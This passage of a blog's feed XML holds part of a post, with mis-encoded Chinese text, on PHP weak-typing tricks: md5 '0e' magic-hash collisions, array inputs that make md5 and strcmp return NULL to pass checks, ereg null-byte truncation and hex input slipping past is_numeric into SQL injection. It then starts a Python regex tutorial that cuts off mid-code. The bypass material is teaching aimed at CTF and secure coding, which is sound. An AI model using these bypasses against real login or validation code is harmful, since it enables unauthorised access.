class="keyword">echo</span> <span class="string">&#x27;False&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¾“å‡ºTrue</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä»¥ä¸Šä»£ç è¯´æ˜äº†ï¼šè‹¥å­—ç¬¦ä¸²ä»¥æ•°å­—å¼€å¤´ï¼Œåˆ™å–å¼€å¤´æ•°å­—ä½œä¸ºè½¬æ¢ç»“æœï¼Œè‹¥æ— åˆ™è¾“å‡º0</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191115143819321.png" alt="image-20191115143819321"></p><p>æ€»ç»“ï¼š ä»¥ä¸Šä»£ç è¯´æ˜äº†ï¼Œè‹¥å­—ç¬¦ä¸²ä»¥æ•°å­—å¼€å¤´ï¼Œåˆ™å–å¼€å¤´æ•°å­—ä½œä¸ºè½¬æ¢ç»“æœï¼Œè‹¥æ— åˆ™è¾“å‡º0</p><h2 id="md5-sha1"><a href="#md5-sha1" class="headerlink" title="md5(),sha1()"></a>md5(),sha1()</h2><ol><li><p>PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!=â€æˆ–â€==â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0 </p></li><li><p>md5()æ˜¯ä¸èƒ½å¤„ç†æ•°ç»„çš„ï¼Œmd5(æ•°ç»„)ä¼šè¿”å›nullï¼Œä¸¤ä¸ªnullç›¸ç­‰ç»•è¿‡,sha1()ä¹Ÿæ˜¯åŒç†</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;QNKCDZO&#x27;</span>;</span><br><span class="line">$b = <span class="string">&#x27;s878926199a&#x27;</span>;</span><br><span class="line">$md5_a = md5($a); <span class="keyword">echo</span> $md5_a.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">$md5_b = md5($b); <span class="keyword">echo</span> $md5_b.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ($md5_a == $md5_b)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;True&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;False&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191115151108336.png" alt="image-20191115144641604"></p><p>è¿™ç§é—®é¢˜ä¹Ÿå«MD5ç¢°æ’ï¼Œæ›´è¯¦ç»†æ›´å¤šçš„å¯ä»¥å‚è€ƒæˆ‘ä¹‹å‰çš„æ–‡ç« ï¼š<a href="https://www.betao.cn/archives/md5same.html">https://www.betao.cn/archives/md5same.html</a> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = $_GET[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> md5($a).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($b).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (md5($a) === md5($b))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;True&#x27;</span>; <span class="comment">// è¾“å‡ºTrue</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Flase&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// betao.cn</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191115145023251.png" alt="image-20191115145023251"></p><p>ä¸Šé¢ä»£ç äº§ç”Ÿçš„åŸå› ä¸ºï¼Œmd5ä¸èƒ½å¤„ç†æ•°ç»„ï¼Œè¿”å›null</p><h2 id="è½¬æ¢"><a href="#è½¬æ¢" class="headerlink" title="è½¬æ¢"></a>è½¬æ¢</h2><p> phpä¼šè‡ªåŠ¨è¿›è¡Œè½¬æ¢ï¼Œæ¯”å¦‚16è¿›åˆ¶ï¼Œç§‘å­¦è®¡æ•°æ³•ç­‰ï¼Œæœ‰æ—¶ä¹Ÿç”¨è¿™ç‚¹ç»•è¿‡ </p><h2 id="strcmpå‡½æ•°æ•°ç»„ç»•è¿‡"><a href="#strcmpå‡½æ•°æ•°ç»„ç»•è¿‡" class="headerlink" title="strcmpå‡½æ•°æ•°ç»„ç»•è¿‡"></a>strcmpå‡½æ•°æ•°ç»„ç»•è¿‡</h2><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191115152253240.png" alt="image-20191115151108336"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (strcmp(<span class="string">&#x27;betao.cn&#x27;</span>, $a))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Flase&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;True&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191115151220918.png" alt="image-20191115151220918"></p><p>åˆ©ç”¨æ•°ç»„<code>a[]=1</code>, è¿”å›Trueï¼ŒæˆåŠŸç»•è¿‡éªŒè¯</p><p> strcmp()å‡½æ•°åªæœ‰åœ¨ç›¸ç­‰çš„æƒ…å†µä¸‹è¿”å›0ã€‚<br>é‚£ä¹ˆæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªæ•°ç»„ï¼Œå®ƒä¼šè¿”å›NULLï¼Œè€Œåˆ¤æ–­ä½¿ç”¨äº†ï¼Œè€ŒNULL=0æ˜¯bool(true)ï¼Œè¿™æ ·å°±æˆåŠŸç»•è¿‡ã€‚  </p><h2 id="ereg-æˆ–è€…-eregi"><a href="#ereg-æˆ–è€…-eregi" class="headerlink" title="ereg() æˆ–è€…  eregi()"></a>ereg() æˆ–è€…  eregi()</h2><p> <code>ereg()</code> å‡½æ•°æˆ– <code>eregi()</code> å‡½æ•°å­˜åœ¨ç©ºå­—ç¬¦æˆªæ–­æ¼æ´ï¼Œå³å‚æ•°ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼æˆ–å¾…åŒ¹é…å­—ç¬¦ä¸²é‡åˆ°ç©ºå­—ç¬¦åˆ™æˆªæ–­ä¸¢å¼ƒåé¢çš„æ•°æ® </p><p>è¯¦ç»†çš„è¯´æ˜ï¼Œå‚è€ƒï¼š <a href="https://www.betao.cn/archives/giveup.html">https://www.betao.cn/archives/giveup.html</a> </p><h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h2><p> <strong>is_numeric()**ä½œç”¨ï¼š åˆ¤æ–­å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ï¼Œä¸ä»…æ£€æŸ¥10è¿›åˆ¶ï¼Œ</strong>16è¿›åˆ¶**æ˜¯å¯ä»¥ </p><ol><li><p><strong>å½“æœ‰ä¸¤ä¸ªis_numericåˆ¤æ–­å¹¶ç”¨andè¿æ¥æ—¶ï¼Œandåé¢çš„is_numericå¯ä»¥ç»•è¿‡</strong> </p></li><li><p>16è¿›åˆ¶ä¹Ÿå¯ä»¥ç»•è¿‡is_numeric()æ£€éªŒï¼Œå¯ä»¥ç”¨æ¥ç»•è¿‡sqlæ³¨å…¥é‡Œçš„è¿‡æ»¤ </p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = $_GET[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">$c = is_numeric($a) <span class="keyword">and</span> is_numeric($b);</span><br><span class="line">var_dump(is_numeric($a));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">var_dump(is_numeric($b));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">var_dump($c);  <span class="comment">// è¿”å›True</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">$test = <span class="literal">false</span> <span class="keyword">and</span> <span class="literal">true</span>; <span class="comment">// è¿”å›False</span></span><br><span class="line">var_dump($test);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191115153145283.png" alt="image-20191115152253240"></p><pre><code>is_numericå‡½æ•°å¯¹äºç©ºå­—ç¬¦%00ï¼Œæ— è®ºæ˜¯%00æ”¾åœ¨å‰åéƒ½å¯ä»¥åˆ¤æ–­ä¸ºéæ•°å€¼ï¼Œè€Œ%20ç©ºæ ¼å­—ç¬¦åªèƒ½æ”¾åœ¨æ•°å€¼åã€‚æ‰€ä»¥ï¼ŒæŸ¥çœ‹å‡½æ•°å‘ç°è¯¥å‡½æ•°å¯¹å¯¹äºç¬¬ä¸€ä¸ªç©ºæ ¼å­—ç¬¦ä¼šè·³è¿‡ç©ºæ ¼å­—ç¬¦åˆ¤æ–­ï¼Œæ¥ç€åé¢çš„åˆ¤æ–­ï¼è¯¥å‡½æ•°è¿˜å¯èƒ½é€ æˆsqlæ³¨å…¥ï¼Œä¾‹å¦‚å°†â€˜1 or 1&#39;è½¬æ¢ä¸º16è¿›åˆ¶å½¢å¼ï¼Œå†ä¼ å‚ï¼Œå°±å¯ä»¥é€ æˆsqlæ³¨å…¥</code></pre><h2 id="switch"><a href="#switch" class="headerlink" title="switch()"></a>switch()</h2><p>å½“switch()æ²¡æœ‰breakæ—¶å¯ä»¥ç»§ç»­å¾€ä¸‹æ‰§è¡Œ<br>è¿™é‡Œä¹Ÿæœ‰è‡ªåŠ¨è½¬æ¢ï¼Œæ¯”å¦‚$a = a,ä¼šå½“0æ‰§è¡Œï¼Œ$a=1aï¼Œä¼šå½“1æ‰§è¡Œâ€¦â€¦</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191115153842529.png" alt="image-20191115153145283"></p><h2 id="NULL-0-â€0â€³-array-ä½¿ç”¨-å’Œfalseæ¯”è¾ƒæ—¶ï¼Œéƒ½ä¼šè¿”å›true"><a href="#NULL-0-â€0â€³-array-ä½¿ç”¨-å’Œfalseæ¯”è¾ƒæ—¶ï¼Œéƒ½ä¼šè¿”å›true" class="headerlink" title="NULL,0,â€0â€³,array()ä½¿ç”¨==å’Œfalseæ¯”è¾ƒæ—¶ï¼Œéƒ½ä¼šè¿”å›true"></a>NULL,0,â€0â€³,array()ä½¿ç”¨==å’Œfalseæ¯”è¾ƒæ—¶ï¼Œéƒ½ä¼šè¿”å›true</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="literal">NULL</span>;</span><br><span class="line">$b = <span class="number">0</span>;</span><br><span class="line">$c = <span class="string">&quot;0&quot;</span>;</span><br><span class="line">$d = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä»¥ä¸‹æ˜¯ä¸‰å…ƒè¿ç®—ç¬¦</span></span><br><span class="line"><span class="keyword">echo</span> $a == <span class="literal">false</span> ? <span class="string">&#x27;True&#x27;</span>: <span class="string">&#x27;False&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b == <span class="literal">false</span> ? <span class="string">&#x27;True&#x27;</span>: <span class="string">&#x27;False&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b == <span class="literal">false</span> ? <span class="string">&#x27;True&#x27;</span>: <span class="string">&#x27;False&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b == <span class="literal">false</span> ? <span class="string">&#x27;True&#x27;</span>: <span class="string">&#x27;False&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191115144641604.png" alt="image-20191115153842529"></p><h2 id="php-ä¼ªåè®®ç»•è¿‡"><a href="#php-ä¼ªåè®®ç»•è¿‡" class="headerlink" title="php://ä¼ªåè®®ç»•è¿‡"></a>php://ä¼ªåè®®ç»•è¿‡</h2><p>æ¥æ”¶å‚æ•°ä¸­ä¸èƒ½å‡ºç°æŸä¸€å­—ç¬¦ï¼Œä½†ä¸‹é¢åˆå¿…é¡»ä½¿ç”¨å¯ä»¥<code>php://ä¼ªåè®®</code>ç»•è¿‡</p><p>ç›®å‰é‡åˆ°çš„æ˜¯<code>file_get_contents()</code>,å…¶ä»–æƒ…å†µå…·ä½“è€Œå®š</p><h2 id="array-search"><a href="#array-search" class="headerlink" title="array_search()"></a>array_search()</h2><p> ç”¨åˆ°äº†PHPå¼±ç±»å‹çš„ä¸€ä¸ªç‰¹æ€§ï¼Œå½“ä¸€ä¸ªæ•´å½¢å’Œä¸€ä¸ªå…¶ä»–ç±»å‹è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠå…¶ä»–ç±»å‹intvalå†æ¯” </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;phpé»‘é­”æ³•&quot;&gt;&lt;a href=&quot;#phpé»‘é­”æ³•&quot; class=&quot;headerlink&quot; title=&quot;phpé»‘é­”æ³•&quot;&gt;&lt;/a&gt;phpé»‘é­”æ³•&lt;/h1&gt;&lt;p&gt;  phpé»‘é­”æ³•å°±æ˜¯æ‰€è°“çš„å¼±ç±»å‹æ¯”è¾ƒï¼Œä¸€äº›å‡½æ•°è¿”å›null,åˆ©ç”¨æ•°ç»„è¿”å›Trueçš„ä¸€äº›é—®é¢˜&lt;/p&gt;
&lt;h2 </summary>
      
    
    
    
    <category term="PHP" scheme="https://taonn.github.io/categories/PHP/"/>
    
    
    <category term="phpå®‰å…¨" scheme="https://taonn.github.io/tags/php%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Pythonæ­£åˆ™è¡¨è¾¾å¼(å…¥é—¨åˆ°è¿›é˜¶)</title>
    <link href="https://taonn.github.io/2020/10/04/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E5%85%A5%E9%97%A8%E5%88%B0%E8%BF%9B%E9%98%B6/"/>
    <id>https://taonn.github.io/2020/10/04/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E5%85%A5%E9%97%A8%E5%88%B0%E8%BF%9B%E9%98%B6/</id>
    <published>2020-10-04T01:13:16.000Z</published>
    <updated>2021-03-16T05:27:20.805Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Python-gt-re"><a href="#Python-gt-re" class="headerlink" title="Python-&gt;re"></a>Python-&gt;re</h2><p>  ä¹‹å‰æƒ³ç€ç©çˆ¬è™«ï¼Œç‰¹æ„æ‰¾ä¸€äº›å¤§ä½¬çš„æ–‡ç« å­¦çš„ï¼Œä½¿ç”¨<code>jupyter notebook</code>å†™çš„,ä»¥ä¸‹æ˜¯å¯¼å‡ºæˆmarkdownè¯­æ³•å½¢æˆçš„æ ·å­ï¼Œä¸€äº›æ›´ç»†èŠ‚çš„è§£é‡Šï¼Œå¯ä»¥å‚çœ‹æ–‡æœ«å¤§ä½¬æ€»ç»“çš„æ–‡ç« ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">str1 = <span class="string">&quot;&lt;table&gt;&lt;tr&gt;hello world 18111234589&lt;tr&gt;&lt;tr&gt;&lt;span&gt;name:å¼ ä¸‰,tel:18711001111&lt;/span&gt;&lt;/tr&gt;&lt;/table&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">éœ€æ±‚ï¼š</span></span><br><span class="line"><span class="string">1.æå–å­—ç¬¦ä¸²ä¸­&lt;span&gt;æ ‡ç­¾é‡Œçš„å†…å®¹ï¼›</span></span><br><span class="line"><span class="string">2.æå–å…¶ä¸­æ‰€æœ‰çš„æ‰‹æœºå·ï¼›</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#ç¬¬ä¸€é¢˜:</span></span><br><span class="line">start = str1.find(<span class="string">&#x27;&lt;span&gt;&#x27;</span>)</span><br><span class="line">end = str1.rfind(<span class="string">&#x27;&lt;/span&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> start != <span class="number">-1</span>:</span><br><span class="line">    print(str1[start+len(<span class="string">&#x27;&lt;span&gt;&#x27;</span>):end])</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç¬¬ä¸€é¢˜ è·å–&lt;span&gt;æ ‡ç­¾å†…çš„æ‰€æœ‰æ•°æ®</span></span><br><span class="line">info = re.search(<span class="string">r&#x27;(?&lt;=&lt;span&gt;).*(?=&lt;/span&gt;)&#x27;</span>,str1)</span><br><span class="line">print(info.group(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¾“å‡ºï¼šname:å¼ ä¸‰,tel:18711001111</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ç¬¬äºŒé¢˜:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">æå–æ‰‹æœºå·ï¼šï¼ˆå¿…é¡»å…ˆæ¸…æ¥šæ‰‹æœºå·çš„è§„åˆ™ï¼‰</span></span><br><span class="line"><span class="string">    1.å¿…é¡»æ˜¯11ä½çš„æ•°å­—</span></span><br><span class="line"><span class="string">    2.ç¬¬ä¸€ä½æ•°å­—ä»¥1å¼€å¤´ï¼Œç¬¬äºŒä½æ•°å­—å¯ä»¥æ˜¯[3,4,5,7,8]ä¸­çš„ä»»æ„ä¸€ä¸ªåé¢9ä¸ªæ˜¯[0-9]ä¸­çš„ä»»æ„ä¸€ä¸ªæ•°å­—</span></span><br><span class="line"><span class="string">    ï¼ˆç°åœ¨è§„åˆ™æ›´å¤šäº†ï¼Œå‡ºç°äº†19**çš„å·ç ï¼Œè¿™é‡Œä½œä¸ºä¾‹å­å°±ç®€å•ä¸€ç‚¹ï¼‰ï¼›</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ç¬¬äºŒé¢˜ æå–æ‰€æœ‰æ‰‹æœºå·ï¼š</span></span><br><span class="line">phone = re.findall(<span class="string">r&#x27;1[345678]\d&#123;9&#125;&#x27;</span>,str1)</span><br><span class="line">print(phone)</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¾“å‡ºï¼š[&#x27;18111234589&#x27;, &#x27;18711001111&#x27;]</span></span><br></pre></td></tr></table></figure><pre><code>name:å¼ ä¸‰,tel:18711001111name:å¼ ä¸‰,tel:18711001111[&#39;18111234589&#39;, &#39;18711001111&#39;]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æœ‰ä¸¤ä¸ªå¸¸è§çš„åŸå› :</span></span><br><span class="line"><span class="string">    ç¬¬ä¸€ä¸ªåŸå› æ˜¯æ•°æ®æŒ–æ˜â€”â€”ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“æˆ‘ä»¬å¸Œæœ›åœ¨ä¸€å¤§å †æ–‡æœ¬ä¸­æ‰¾åˆ°ä¸€å°å †æ–‡æœ¬ï¼Œä¾‹å¦‚ï¼šèº«ä»½è¯ï¼Œæ‰‹æœºå·ï¼Œe-mailç­‰ï¼›</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    ç¬¬äºŒä¸ªåŸå› æ˜¯éªŒè¯ï¼Œå¯ä»¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ç¡®è®¤è·å¾—çš„æ•°æ®æ˜¯ä½ æ‰€æœŸæœ›çš„ï¼Œå¦‚ç”¨æˆ·éªŒè¯ï¼Œå¯†ç é•¿åº¦å’Œæ ¼å¼çš„éªŒè¯ï¼›</span></span><br><span class="line"><span class="string">re æ¨¡å—</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#é¦–å…ˆæˆ‘ä»¬å­¦ä¹ ç¬¬ä¸€ä¸ªå‡½æ•°ï¼Œsearch()å‡½æ•°ï¼Œå®ƒçš„ç›®çš„æ˜¯æ¥æ”¶ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼å’Œä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›å‘ç°çš„ç¬¬ä¸€ä¸ªåŒ¹é…çš„å­—ç¬¦ä¸²</span></span><br><span class="line"></span><br><span class="line">a = re.search(<span class="string">r&#x27;fox&#x27;</span>,<span class="string">&#x27;the quick brown fox jumpred&#x27;</span>)</span><br><span class="line"><span class="comment">#ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ­£åˆ™è¡¨è¾¾å¼ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºè¦å¤„ç†çš„å­—ç¬¦ä¸²</span></span><br><span class="line">print(a.span()) <span class="comment">#spanæ–¹æ³•è·å–çš„æ˜¯æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…åˆ°çš„ä½ç½®,è¾“å‡º&#x27;(16,19)&#x27;</span></span><br><span class="line"></span><br><span class="line">b = re.search(<span class="string">r&#x27;www&#x27;</span>,<span class="string">&#x27;the quick brown fox jumpred&#x27;</span>)</span><br><span class="line">print(b) <span class="comment">#è¾“å‡ºNone</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>(16, 19)None</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#æ‰¾åˆ°å¤šä¸ªåŒ¹é…</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">re.search çš„ä¸€ä¸ªé™åˆ¶æ˜¯å®ƒä»…ä»…è¿”å›æœ€è¿‘ä¸€ä¸ªä»¥ match å¯¹è±¡å½¢å¼çš„åŒ¹é…ï¼Œå¦‚æœåœ¨ä¸€ä¸ªå­—ç¬¦ä¸²å†…å­˜åœ¨å¤šä¸ªåŒ¹é…ï¼Œ</span></span><br><span class="line"><span class="string">re.search()åªä¼šè¿”å›ç¬¬ä¸€ä¸ªåŒ¹é…ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è¿™ä¹Ÿæ˜¯æˆ‘ä»¬æœŸæœ›çš„ç»“æœï¼Œä½†æ˜¯ï¼Œæœ‰æ—¶å€™éœ€è¦å½“å¤šä¸ªåŒ¹é…å­˜åœ¨æ—¶è¿›è¡Œå¤šä¸ªåŒ¹é…ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å¦‚æœæœ‰è¿™ç§éœ€æ±‚å’±ä»¬å¯ä»¥ä½¿ç”¨ findall æˆ–è€… finditerã€‚</span></span><br><span class="line"><span class="string">ä¸¤ä¸ªæ–¹æ³•çš„åŒºåˆ«åœ¨äº findall è¿”å›çš„æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œ</span></span><br><span class="line"><span class="string">finditerè¿”å›çš„æ˜¯ä¸€ä¸ªç”Ÿæˆå™¨</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">l = re.findall(<span class="string">r&#x27;å¼ &#x27;</span>,<span class="string">&#x27;å¼ ä¸‰ å¼ ä¸‰ä¸° å¼ æ— å¿Œ å¼ å°å‡¡&#x27;</span>)</span><br><span class="line">print(l)</span><br><span class="line"></span><br><span class="line"><span class="comment">#åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ä¼šå‘ç°findallè¿”å›äº†æ‰€æœ‰åŒ¹é…çš„å€¼ï¼Œè¿™æ˜¯å› ä¸ºâ€œå¼ â€å­—åœ¨åé¢çš„å­—ç¬¦ä¸²ä¸­å‡ºç°äº†4æ¬¡</span></span><br></pre></td></tr></table></figure><pre><code>[&#39;å¼ &#39;, &#39;å¼ &#39;, &#39;å¼ &#39;, &#39;å¼ &#39;]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#åŸºç¡€æ­£åˆ™è¡¨è¾¾å¼</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span 